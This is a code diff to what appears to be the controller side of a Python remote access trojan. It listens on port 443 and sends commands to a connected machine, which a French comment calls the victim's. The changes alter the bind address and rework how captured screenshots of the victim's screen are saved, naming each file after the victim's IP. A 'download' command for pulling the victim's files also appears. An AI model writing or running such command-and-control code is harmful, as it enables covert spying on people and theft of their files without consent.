@@ -22,7 +22,7 @@ def connection():
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     # Bind the socket to an IP address and port
-    s.bind(("192.168.1.35", 443))
+    s.bind(("192.168.100.9", 443))
 
     # Start listening for incoming connections
     s.listen(5)
@@ -87,14 +87,23 @@ def shell():
             elif command.strip() == "screenshot":
                 sending(command)
                 response = receive()
-                print(response.get("status"))
                 if response.get("status") == "success":
-                    with open("C:\\Users\\HP\\OneDrive\\Desktop\\screenshot.png", "wb") as f:
-                        f.write(bytes.fromhex(response["data"]))
-                    print("Screenshot saved as screenshot.png")
+                    try:
+                        screenshot_data = response.get("data")
+                        if not screenshot_data:
+                            print("No screenshot data received.")
+                            continue
+                        # Chemin de sauvegarde
+                        screenshot_path = os.path.join("C:\\Users\\HP\\OneDrive\\Desktop", f"{ip}_ScreenShot.png")
+                        with open(screenshot_path, "wb") as f:
+                            f.write(bytes.fromhex(screenshot_data))
+                        print(f"Screenshot saved successfully at {screenshot_path}.")
+                    except Exception as e:
+                        print(f"Error saving screenshot: {str(e)}")
                 else:
                     print(f"Error taking screenshot: {response.get('message')}")
                 continue
+
             
             #la commande pour puisse telecharger des fichier ou des dossier depuis la machine de la vicitme
             elif command.startswith("download "):
